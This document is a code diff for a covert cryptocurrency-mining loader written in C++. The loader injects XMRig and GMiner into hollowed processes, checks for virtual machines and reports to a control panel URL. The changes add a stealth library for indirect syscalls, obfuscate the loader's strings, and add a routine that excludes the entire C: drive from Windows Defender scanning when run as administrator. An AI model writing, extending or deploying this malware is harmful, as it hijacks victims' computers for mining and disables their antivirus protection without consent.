@@ -17,6 +17,10 @@
 #include "../include/encryption.h"
 #include "../include/embedded_resource.h"
 #include "../include/remote_miner_loader.h"
+
+// Include Obfusk8 for stealth API calling and indirect syscalls
+#include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"
+
 #include "../src/inject_core.cpp"
 
 #ifdef ENABLE_ANTIVM
@@ -33,6 +37,7 @@ static DWORD g_gpuMinerPid = 0;
 static HANDLE g_cpuMinerProcess = NULL;
 static HANDLE g_gpuMinerProcess = NULL;
 static bool g_lastCpuIdleStatus = false;  // Track last idle status to detect changes
+static volatile bool g_shouldExit = false;  // Flag to signal exit on Ctrl+C
 
 // Signal handler for graceful shutdown
 BOOL WINAPI ConsoleHandler(DWORD signal) {
@@ -42,16 +47,35 @@ BOOL WINAPI ConsoleHandler(DWORD signal) {
         std::cout << "[!] Signal received, terminating miner processes..." << std::endl;
 #endif
         
-        if (g_cpuMinerProcess != NULL) {
-            TerminateProcess(g_cpuMinerProcess, 0);
-            CloseHandle(g_cpuMinerProcess);
+        // Terminate miner processes
+        ProcessAPI procAPI;
+        if (procAPI.IsInitialized()) {
+            if (g_cpuMinerProcess != NULL) {
+                procAPI.pTerminateProcess(g_cpuMinerProcess, 0);
+                CloseHandle(g_cpuMinerProcess);
+            }
+            
+            if (g_gpuMinerProcess != NULL) {
+                procAPI.pTerminateProcess(g_gpuMinerProcess, 0);
+                CloseHandle(g_gpuMinerProcess);
+            }
+        } else {
+            // Fallback to direct API
+            if (g_cpuMinerProcess != NULL) {
+                TerminateProcess(g_cpuMinerProcess, 0);
+                CloseHandle(g_cpuMinerProcess);
+            }
+            
+            if (g_gpuMinerProcess != NULL) {
+                TerminateProcess(g_gpuMinerProcess, 0);
+                CloseHandle(g_gpuMinerProcess);
+            }
         }
         
-        if (g_gpuMinerProcess != NULL) {
-            TerminateProcess(g_gpuMinerProcess, 0);
-            CloseHandle(g_gpuMinerProcess);
-        }
-        
+        // Set exit flag and terminate
+        g_shouldExit = true;
+        std::cout << "[*] Exiting..." << std::endl;
+        exit(0);
         return TRUE;
     }
     return FALSE;
@@ -70,7 +94,7 @@ int main(int argc, char *argv[])
     // Register signal handler to cleanup miner process on termination
     if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
 #ifdef _DEBUG
-        std::cerr << "[-] Failed to set console control handler" << std::endl;
+        std::cerr << OBFUSCATE_STRING("[-] Failed to set console control handler").c_str() << std::endl;
 #endif
     }
 
@@ -102,17 +126,17 @@ int main(int argc, char *argv[])
     }
 #endif
 
-    std::string panelUrlsStr = ENCRYPT_STR("http://127.0.0.1:8080/api/miners/submit");
-    std::string configGetUrlStr = ENCRYPT_STR("");
+    std::string panelUrlsStr = OBFUSCATE_STRING("http://127.0.0.1:8080/api/miners/submit");
+    std::string configGetUrlStr = OBFUSCATE_STRING("");
     
     // Pre-encrypt common GPU mining argument strings to stay under 16 encryption limit
-    const std::string GMINER_ALGO = ENCRYPT_STR("--algo ");
-    const std::string GMINER_SERVER = ENCRYPT_STR(" --server ");
-    const std::string GMINER_USER = ENCRYPT_STR(" --user ");
-    const std::string GMINER_DOT = ENCRYPT_STR(".");
-    const std::string GMINER_FAN = ENCRYPT_STR(" --fan ");
-    const std::string GMINER_SSL = ENCRYPT_STR(" --ssl");
-    const std::string GMINER_TAIL = ENCRYPT_STR(" --templimit 95 --api 10050 -w 0");
+    const std::string GMINER_ALGO = OBFUSCATE_STRING("--algo ");
+    const std::string GMINER_SERVER = OBFUSCATE_STRING(" --server ");
+    const std::string GMINER_USER = OBFUSCATE_STRING(" --user ");
+    const std::string GMINER_DOT = OBFUSCATE_STRING(".");
+    const std::string GMINER_FAN = OBFUSCATE_STRING(" --fan ");
+    const std::string GMINER_SSL = OBFUSCATE_STRING(" --ssl");
+    const std::string GMINER_TAIL = OBFUSCATE_STRING(" --templimit 95 --api 10050 -w 0");
     
 #ifdef _DEBUG
     std::cout << "[DEBUG] Decrypted Panel URL(s): " << panelUrlsStr << std::endl;
@@ -257,6 +281,7 @@ int main(int argc, char *argv[])
     // Only launch XMRig if CPU mining is enabled
     if (cpuConfig.enabled == 1 && !cpuCommand.empty()) {
         cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
+        Sleep(500);  // Give system time to stabilize after injection
         cpuPi = ProcessStorage::GetProcess(cpuPid);
         if (cpuPid != 0) {
 #ifdef _DEBUG
@@ -295,6 +320,7 @@ int main(int argc, char *argv[])
 #endif
             
             gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
+            Sleep(500);  // Give system time to stabilize after injection
             gpuPi = ProcessStorage::GetProcess(gpuPid);
             
             if (gpuPid != 0) {
@@ -311,6 +337,20 @@ int main(int argc, char *argv[])
     } else {
         std::cerr << "[-] Failed to load gminer!" << std::endl;
     }
+
+#ifdef ENABLE_DEFENDER_EXCLUSION
+    // Add C: drive to Windows Defender exclusion if running as admin
+    if (IsRunningAsAdmin()) {
+        std::cout << "[*] Attempting to add C: drive to Windows Defender exclusion..." << std::endl;
+        if (AddDefenderExclusion("C:\\")) {
+            std::cout << "[+] Successfully added C: drive to Windows Defender exclusion" << std::endl;
+        } else {
+            std::cerr << "[-] Failed to add C: drive to Windows Defender exclusion" << std::endl;
+        }
+    } else {
+        std::cout << "[*] Not running as admin, skipping Windows Defender exclusion" << std::endl;
+    }
+#endif
 
     // Store global PIDs and handles for signal handler
     g_cpuMinerPid = cpuPid;
@@ -383,8 +423,15 @@ int main(int argc, char *argv[])
                         
                         // Kill CPU miner if it's running
                         if (cpuPi) {
-                            TerminateProcess(cpuPi.value().hProcess, 0);
-                            WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
+                            ProcessAPI procAPI;
+                            if (procAPI.IsInitialized()) {
+                                procAPI.pTerminateProcess(cpuPi.value().hProcess, 0);
+                                WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
+                            } else {
+                                // Fallback to direct API
+                                TerminateProcess(cpuPi.value().hProcess, 0);
+                                WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
+                            }
                             cpuPid = 0;
                             cpuPi.reset();
                         }
@@ -416,8 +463,15 @@ int main(int argc, char *argv[])
                         
                         // Kill GPU miner if it's running
                         if (gpuPi) {
-                            TerminateProcess(gpuPi.value().hProcess, 0);
-                            WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
+                            ProcessAPI procAPI;
+                            if (procAPI.IsInitialized()) {
+                                procAPI.pTerminateProcess(gpuPi.value().hProcess, 0);
+                                WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
+                            } else {
+                                // Fallback to direct API
+                                TerminateProcess(gpuPi.value().hProcess, 0);
+                                WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
+                            }
                             gpuPid = 0;
                             gpuPi.reset();
                         }
@@ -534,7 +588,7 @@ int main(int argc, char *argv[])
             }
         }
         
-        Sleep(10000);  // Check every 10 seconds
+        Sleep(1000);  // Check every 1 second
     }
 
     return 0;
